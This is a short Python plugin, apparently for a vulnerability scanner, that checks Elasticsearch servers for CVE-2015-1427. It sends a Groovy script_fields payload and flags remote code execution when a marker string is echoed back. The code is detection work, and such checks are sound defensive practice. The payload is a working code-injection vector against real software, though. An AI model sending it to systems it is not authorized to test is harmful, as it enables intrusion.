#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#__author__ = 'xfkxfk'


import socket, urlparse

def assign(service, arg):
    if service == "ip":
        return True, arg

def audit(arg):
    url = "http://"+arg+":9200/_search?pretty"
    data = '''r{"size":1,"script_fields": {"my_field": {"script": "def res=\\"3b8096391df29b2ce44a81b9e436f769\\";res","lang":"groovy"}}}'''
    code, head, res, errcode,finalurl =  curl.curl2(url,post=data)
    if res.find('3b8096391df29b2ce44a81b9e436f769') != -1 and "Parse Failure" not in res:
        security_hole('ElasticSearch Groovy remote code exec(CVE-2015-1427)')

if __name__ == '__main__':
    from dummy import *
    audit(assign('ip', '8.8.8.8')[1])